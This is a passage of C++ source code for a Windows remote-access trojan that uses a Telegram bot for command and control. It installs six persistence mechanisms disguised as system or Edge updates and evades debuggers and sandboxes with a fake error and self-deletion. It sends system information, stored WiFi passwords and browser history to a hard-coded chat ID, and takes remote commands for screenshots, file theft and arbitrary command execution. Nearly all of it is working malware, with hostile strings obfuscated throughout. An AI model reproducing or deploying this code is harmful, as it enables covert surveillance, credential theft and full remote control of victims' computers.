            IShellLinkA* psl;
            if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
                IID_IShellLinkA, (void**)&psl))) {
                
                psl->SetPath(current_exe.c_str());
                psl->SetDescription(OBFUSCATE("System Update"));
                
                IPersistFile* ppf;
                if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
                    std::wstring wpath(shortcut_path.begin(), shortcut_path.end());
                    ppf->Save(wpath.c_str(), TRUE);
                    ppf->Release();
                }
                psl->Release();
            }
            CoUninitialize();
            return true;
        }
        return false;
    }
    
    // Method 3: Scheduled Task (Current User)
    bool installScheduledTask() {
        std::string task_name = OBFUSCATE("MicrosoftEdgeUpdateTask_") + 
            std::to_string(GetCurrentProcessId());
        std::string cmd = OBFUSCATE("schtasks /create /tn \"") + task_name + 
            OBFUSCATE("\" /tr \"") + current_exe + OBFUSCATE("\" /sc daily /st 09:00 /f");
        system(cmd.c_str());
        return true;
    }
    
    // Method 4: WMI Event Subscription
    bool installWMI() {
        std::string filter_name = OBFUSCATE("UpdateFilter_") + 
            std::to_string(GetCurrentProcessId());
        std::string consumer_name = OBFUSCATE("UpdateConsumer_") + 
            std::to_string(GetCurrentProcessId());
        
        // Create WMI event filter (triggers every 30 minutes)
        std::string filter_cmd = OBFUSCATE("wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE Name=\"") + 
            filter_name + OBFUSCATE("\", EventNameSpace=\"root\\cimv2\", QueryLanguage=\"WQL\", ") + 
            OBFUSCATE("Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 1800 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"");
        system(filter_cmd.c_str());
        
        // Create command line event consumer
        std::string consumer_cmd = OBFUSCATE("wmic /NAMESPACE:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name=\"") + 
            consumer_name + OBFUSCATE("\", CommandLineTemplate=\"") + current_exe + OBFUSCATE("\"");
        system(consumer_cmd.c_str());
        
        // Create binding
        std::string binding_cmd = OBFUSCATE("wmic /NAMESPACE:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name='") + 
            filter_name + OBFUSCATE("'\", Consumer=\"CommandLineEventConsumer.Name='") + 
            consumer_name + OBFUSCATE("'\"");
        system(binding_cmd.c_str());
        
        return true;
    }
    
    // Method 5: BITS Job
    bool installBITS() {
        std::string job_name = OBFUSCATE("UpdateJob_") + 
            std::to_string(GetCurrentProcessId());
        
        // Create BITS job
        std::string cmd = OBFUSCATE("bitsadmin /create ") + job_name;
        system(cmd.c_str());
        
        // Set notify command line (runs when job completes - immediately)
        cmd = OBFUSCATE("bitsadmin /SetNotifyCmdLine ") + job_name + 
            OBFUSCATE(" cmd.exe \"/c ") + current_exe + OBFUSCATE("\"");
        system(cmd.c_str());
        
        // Set retry delay
        cmd = OBFUSCATE("bitsadmin /SetMinRetryDelay ") + job_name + OBFUSCATE(" 60");
        system(cmd.c_str());
        
        // Add a dummy file to trigger immediate completion
        cmd = OBFUSCATE("bitsadmin /addfile ") + job_name + 
            OBFUSCATE(" https://www.msftconnecttest.com/connecttest.txt C:\\Windows\\Temp\\dummy.txt");
        system(cmd.c_str());
        
        // Resume job
        cmd = OBFUSCATE("bitsadmin /resume ") + job_name;
        system(cmd.c_str());
        
        return true;
    }
    
    // Method 6: ActiveX/COM Object Registration
    bool installCOM() {
        HKEY hKey;
        std::string clsid = OBFUSCATE("{00000000-0000-0000-0000-") + random_hex(12) + OBFUSCATE("}");
        
        // Register in HKCU
        std::string key_path = OBFUSCATE("Software\\Classes\\CLSID\\") + clsid;
        if (RegCreateKeyExA(HKEY_CURRENT_USER, key_path.c_str(), 0, NULL, 
            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            
            RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)OBFUSCATE("System Update"), 13);
            RegCloseKey(hKey);
            
            // Add InprocServer32
            std::string inproc_path = key_path + OBFUSCATE("\\InprocServer32");
            if (RegCreateKeyExA(HKEY_CURRENT_USER, inproc_path.c_str(), 0, NULL,
                REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                
                RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)current_exe.c_str(), 
                    current_exe.length() + 1);
                RegSetValueExA(hKey, OBFUSCATE("ThreadingModel"), 0, REG_SZ, 
                    (BYTE*)OBFUSCATE("Apartment"), 9);
                RegCloseKey(hKey);
                
                return true;
            }
        }
        return false;
    }
    
    void installAll() {
        installRegistryRun();
        installStartupFolder();
        installScheduledTask();
        installWMI();
        installBITS();
        installCOM();
    }
    
    void removeAll() {
        // Remove Registry Run
        std::string key_name = OBFUSCATE("WindowsUpdate_") + 
            std::to_string(GetCurrentProcessId());
        RegDeleteKeyValueA(HKEY_CURRENT_USER, 
            OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run").c_str(), 
            key_name.c_str());
        
        // Remove Startup Folder shortcut
        char startup_path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
            std::string shortcut_path = std::string(startup_path) + 
                OBFUSCATE("\\SystemUpdate.lnk");
            DeleteFileA(shortcut_path.c_str());
        }
        
        // Remove Scheduled Task
        std::string task_name = OBFUSCATE("MicrosoftEdgeUpdateTask_") + 
            std::to_string(GetCurrentProcessId());
        std::string cmd = OBFUSCATE("schtasks /delete /tn \"") + task_name + 
            OBFUSCATE("\" /f");
        system(cmd.c_str());
        
        // Remove BITS Job
        std::string job_name = OBFUSCATE("UpdateJob_") + 
            std::to_string(GetCurrentProcessId());
        cmd = OBFUSCATE("bitsadmin /cancel ") + job_name;
        system(cmd.c_str());
        
        // WMI removal would require enumeration - skipping for brevity
    }
    
private:
    std::string random_hex(int length) {
        static const char hex[] = OBFUSCATE("0123456789ABCDEF");
        std::string result;
        result.reserve(length);
        for (int i = 0; i < length; i++) {
            result += hex[rand() % 16];
        }
        return result;
    }
};



class AntiDebug {
public:
    static bool isDebuggerPresent() {
        // Check for debugger
        if (IsDebuggerPresent()) return true;
        
        // Check for remote debugger via NtQueryInformationProcess
        typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
            HANDLE, DWORD, PVOID, ULONG, PULONG);
        
        HMODULE hNtdll = GetModuleHandleA(OBFUSCATE("ntdll.dll").c_str());
        if (hNtdll) {
            pNtQueryInformationProcess NtQueryInformationProcess = 
                (pNtQueryInformationProcess)GetProcAddress(hNtdll, 
                    OBFUSCATE("NtQueryInformationProcess"));
            
            if (NtQueryInformationProcess) {
                DWORD debugPort = 0;
                NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(),
                    0x7, &debugPort, sizeof(debugPort), nullptr);
                if (status == 0 && debugPort != 0) return true;
            }
        }
        
        // Check for hardware breakpoints
        CONTEXT ctx = {0};
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (GetThreadContext(GetCurrentThread(), &ctx)) {
            if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0) return true;
        }
        
        return false;
    }
    
    static bool isSandbox() {
        // Check for sandbox processes
        const char* sandbox_processes[] = {
            OBFUSCATE("vboxservice.exe"), OBFUSCATE("vboxtray.exe"), 
            OBFUSCATE("vmtoolsd.exe"), OBFUSCATE("vmwaretray.exe"),
            OBFUSCATE("xenservice.exe"), OBFUSCATE("qemu-ga.exe"), 
            OBFUSCATE("sandboxie.exe"), OBFUSCATE("procmon.exe"),
            OBFUSCATE("wireshark.exe"), OBFUSCATE("dumpcap.exe")
        };
        
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = {0};
            pe.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(snapshot, &pe)) {
                do {
                    std::string process_name = pe.szExeFile;
                    for (const auto& sandbox : sandbox_processes) {
                        if (process_name.find(sandbox) != std::string::npos) {
                            CloseHandle(snapshot);
                            return true;
                        }
                    }
                } while (Process32Next(snapshot, &pe));
            }
            CloseHandle(snapshot);
        }
        
        // Check MAC address for VMs
        IP_ADAPTER_INFO adapter_info[16];
        DWORD size = sizeof(adapter_info);
        
        if (GetAdaptersInfo(adapter_info, &size) == NO_ERROR) {
            PIP_ADAPTER_INFO adapter = adapter_info;
            while (adapter) {
                if (adapter->AddressLength >= 3) {
                    // VMware, VirtualBox, Hyper-V MAC prefixes
                    if ((adapter->Address[0] == 0x00 && adapter->Address[1] == 0x50 && adapter->Address[2] == 0x56) ||
                        (adapter->Address[0] == 0x00 && adapter->Address[1] == 0x0C && adapter->Address[2] == 0x29) ||
                        (adapter->Address[0] == 0x00 && adapter->Address[1] == 0x15 && adapter->Address[2] == 0x5D)) {
                        return true;
                    }
                }
                adapter = adapter->Next;
            }
        }
        
        return false;
    }
    
    static void junkCodeLoop() {
        volatile int x = 0;
        for (int i = 0; i < 10000; i++) {
            x += i;
            x ^= x << 2;
            x |= x >> 1;
        }
    }
};



class LabPayload {
private:
    TelegramBotManager bot;
    PersistenceEngine persistence;
    BehavioralMasker masker;
    std::string chat_id;
    bool running;
    std::thread command_thread;
    
public:
    LabPayload(const std::string& target_chat_id) : 
        chat_id(target_chat_id), running(false) {}
    
    void start() {
        running = true;
        
        // Start behavioral masking
        masker.start_masking();
        
        // Install persistence
        persistence.installAll();
        
        // Send initial info
        sendInitialInfo();
        
        // Start command listener
        command_thread = std::thread(&LabPayload::commandListener, this);
    }
    
    void stop() {
        running = false;
        masker.stop_masking();
        if (command_thread.joinable()) {
            command_thread.join();
        }
    }
    
private:
    void sendInitialInfo() {
        // System info
        std::string sys_info = SystemInfo::getAllInfo();
        bot.sendMessage(chat_id, sys_info);
        
        // WiFi passwords
        std::string wifi_info = WiFiPasswordExtractor::extractAll();
        bot.sendMessage(chat_id, wifi_info);
        
        // Browser history
        bot.sendMessage(chat_id, BrowserHistoryExtractor::extractChrome());
        bot.sendMessage(chat_id, BrowserHistoryExtractor::extractFirefox());
        bot.sendMessage(chat_id, BrowserHistoryExtractor::extractEdge());
    }
    
    void commandListener() {
        int last_update_id = 0;
        
        while (running) {
            AntiDebug::junkCodeLoop();
            std::this_thread::sleep_for(std::chrono::seconds(3));
            
            // Get updates from Telegram
            std::string response = bot.getUpdates();
            
            // Parse JSON manually (simplified)
            size_t result_pos = response.find(OBFUSCATE("\"result\""));
            if (result_pos == std::string::npos) continue;
            
            size_t update_id_pos = response.find(OBFUSCATE("\"update_id\":"));
            while (update_id_pos != std::string::npos) {
                size_t id_start = update_id_pos + 11;
                size_t id_end = response.find(',', id_start);
                int update_id = std::stoi(response.substr(id_start, id_end - id_start));
                
                if (update_id > last_update_id) {
                    last_update_id = update_id;
                    
                    // Look for message text
                    size_t text_pos = response.find(OBFUSCATE("\"text\":\""), id_end);
                    if (text_pos != std::string::npos) {
                        text_pos += 8;
                        size_t text_end = response.find('\"', text_pos);
                        std::string cmd = response.substr(text_pos, text_end - text_pos);
                        processCommand(cmd);
                    }
                }
                
                update_id_pos = response.find(OBFUSCATE("\"update_id\":"), update_id_pos + 1);
            }
        }
    }
    
    void processCommand(const std::string& cmd) {
        if (cmd == OBFUSCATE("/screenshot") || cmd == OBFUSCATE("/s")) {
            takeAndSendScreenshot();
        }
        else if (cmd == OBFUSCATE("/info") || cmd == OBFUSCATE("/i")) {
            bot.sendMessage(chat_id, SystemInfo::getAllInfo());
        }
        else if (cmd == OBFUSCATE("/wifi") || cmd == OBFUSCATE("/w")) {
            bot.sendMessage(chat_id, WiFiPasswordExtractor::extractAll());
        }
        else if (cmd == OBFUSCATE("/history") || cmd == OBFUSCATE("/h")) {
            bot.sendMessage(chat_id, BrowserHistoryExtractor::extractChrome());
            bot.sendMessage(chat_id, BrowserHistoryExtractor::extractFirefox());
            bot.sendMessage(chat_id, BrowserHistoryExtractor::extractEdge());
        }
        else if (cmd.find(OBFUSCATE("/download ")) == 0) {
            std::string filepath = cmd.substr(10);
            downloadAndSendFile(filepath);
        }
        else if (cmd.find(OBFUSCATE("/exec ")) == 0) {
            std::string command = cmd.substr(6);
            executeAndSendResult(command);
        }
        else if (cmd == OBFUSCATE("/persist")) {
            persistence.installAll();
            bot.sendMessage(chat_id, OBFUSCATE("✅ Persistence methods installed"));
        }
        else if (cmd == OBFUSCATE("/remove")) {
            persistence.removeAll();
            bot.sendMessage(chat_id, OBFUSCATE("✅ Persistence methods removed"));
        }
        else if (cmd == OBFUSCATE("/help")) {
            std::string help = 
                OBFUSCATE("📚 **Available Commands**\n\n"
                "/screenshot, /s - Take screenshot\n"
                "/info, /i - System information\n"
                "/wifi, /w - WiFi passwords\n"
                "/history, /h - Browser history\n"
                "/download <path> - Download file\n"
                "/exec <cmd> - Execute command\n"
                "/persist - Install persistence\n"
                "/remove - Remove persistence\n"
                "/exit - Exit payload");
            bot.sendMessage(chat_id, help);
        }
        else if (cmd == OBFUSCATE("/exit")) {
            bot.sendMessage(chat_id, OBFUSCATE("👋 Exiting..."));
            running = false;
            ExitProcess(0);
        }
    }
    
    void takeAndSendScreenshot() {
        bot.sendMessage(chat_id, OBFUSCATE("📸 Taking screenshot..."));
        
        std::vector<BYTE> screenshot = ScreenshotCapture::captureToMemory();
        
        if (!screenshot.empty()) {
            bot.sendPhoto(chat_id, screenshot, OBFUSCATE("Screenshot taken at ") + 
                SystemInfo::getCurrentTime());
        } else {
            bot.sendMessage(chat_id, OBFUSCATE("❌ Failed to take screenshot"));
        }
    }
    
    void downloadAndSendFile(const std::string& path) {
        std::ifstream file(path, std::ios::binary);
        if (file.is_open()) {
            std::vector<BYTE> data((std::istreambuf_iterator<char>(file)),
                std::istreambuf_iterator<char>());
            file.close();
            
            std::string filename = fs::path(path).filename().string();
            bot.sendFile(chat_id, data, filename, OBFUSCATE("📁 File: ") + filename);
        } else {
            bot.sendMessage(chat_id, OBFUSCATE("❌ File not found: ") + path);
        }
    }
    
    void executeAndSendResult(const std::string& command) {
        bot.sendMessage(chat_id, OBFUSCATE("⚙️ Executing: `") + command + OBFUSCATE("`"));
        
        FILE* pipe = _popen(command.c_str(), OBFUSCATE("r"));
        if (!pipe) {
            bot.sendMessage(chat_id, OBFUSCATE("❌ Failed to execute command"));
            return;
        }
        
        char buffer[4096];
        std::string result;
        while (fgets(buffer, sizeof(buffer), pipe)) {
            result += buffer;
        }
        _pclose(pipe);
        
        if (result.empty()) {
            result = OBFUSCATE("Command executed (no output)");
        }
        
        // Split long output
        if (result.length() > 4000) {
            bot.sendMessage(chat_id, result.substr(0, 4000) + OBFUSCATE("\n... (truncated)"));
        } else {
            bot.sendMessage(chat_id, OBFUSCATE("```\n") + result + OBFUSCATE("\n```"));
        }
    }
};



void SelfDestruct() {
    char module_path[MAX_PATH];
    GetModuleFileNameA(NULL, module_path, MAX_PATH);
    
    std::string batch_file = std::string(getenv(OBFUSCATE("TEMP").c_str())) + 
        OBFUSCATE("\\cleanup.bat");
    std::ofstream batch(batch_file);
    batch << OBFUSCATE("@echo off\r\n");
    batch << OBFUSCATE(":loop\r\n");
    batch << OBFUSCATE("del \"") << module_path << OBFUSCATE("\"\r\n");
    batch << OBFUSCATE("if exist \"") << module_path << OBFUSCATE("\" goto loop\r\n");
    batch << OBFUSCATE("del \"") << batch_file << OBFUSCATE("\"\r\n");
    batch.close();
    
    ShellExecuteA(NULL, OBFUSCATE("open").c_str(), batch_file.c_str(), 
        NULL, NULL, SW_HIDE);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    
    
    srand(time(NULL) ^ GetCurrentProcessId() ^ GetTickCount());
    
    if (AntiDebug::isDebuggerPresent() || AntiDebug::isSandbox()) {
        // Launch decoy and self-destruct
        MessageBoxA(NULL, OBFUSCATE("Application failed to initialize properly.").c_str(),
            OBFUSCATE("Error").c_str(), MB_OK | MB_ICONERROR);
        SelfDestruct();
        return 0;
    }
    
    
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    
    std::string chat_id = OBFUSCATE("7369364451");
    
    
    LabPayload payload(chat_id);
    payload.start();
    
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    WSACleanup();
    return 0;
}
